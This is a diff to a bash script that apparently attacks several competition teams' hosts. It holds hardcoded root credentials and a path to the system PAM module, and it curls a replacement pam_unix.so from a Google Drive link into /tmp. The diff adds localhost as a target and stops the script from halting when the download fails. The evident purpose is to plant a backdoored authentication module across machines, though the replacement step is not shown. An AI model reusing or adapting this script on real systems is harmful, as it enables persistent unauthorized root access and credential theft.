@@ -1,7 +1,7 @@
 #!/bin/bash
 
 username="root"
-password="Password1!"
+password="sawyer"
 
 timeout=5
 max_jobs=10
@@ -9,7 +9,7 @@ path_to_pam="/lib/x86_64-linux-gnu/security/pam_unix.so"
 path_to_tmp_pam="/tmp/pam_unix.so"
 link_to_pam="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
 
-IPs=()
+IPs=("127.0.0.1")
 network_id="1.1"
 number_of_teams=10
 host_ids=(1 2 3)
@@ -25,9 +25,7 @@ create_IPs() {
 main() {
     curl -o "$path_to_tmp_pam" "$link_to_pam" && \
     echo "Downloaded pam file successfully" || \
-    { echo "Failed to download pam file"; exit 1; }
-
-    sleep 5
+    echo "Failed to download pam file"
 
     create_IPs
 
